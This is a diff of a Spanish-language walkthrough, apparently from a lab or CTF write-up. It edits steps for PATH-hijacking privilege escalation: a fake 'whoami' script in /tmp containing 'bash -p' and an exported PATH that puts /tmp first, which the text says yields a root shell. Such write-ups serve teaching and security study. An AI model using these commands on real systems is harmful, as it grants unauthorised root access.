@@ -80,18 +80,14 @@ Pero antes de hacerlo, debemos crear un fichero que contenga el comando con el q
 cd /tmp
 touch whoami
 chmod 755 whoami
-```
-El contenido de whoami será el siguiente:
-```
-bash -p
+echo "bash -p" > whoami
 ```
 De esa forma nos devolverá una shell con privilegios de root. <br>
-
-Ahora se modificaré el PATH: <br>
+Ahora se modificará el PATH: <br>
 ```
 export PATH=/tmp:$PATH
 ```
 El comienzo del path, se debería ver de la siguiente forma usando echo $PATH
 ```
-
+/tmp:/usr/local/bin ...
 ```
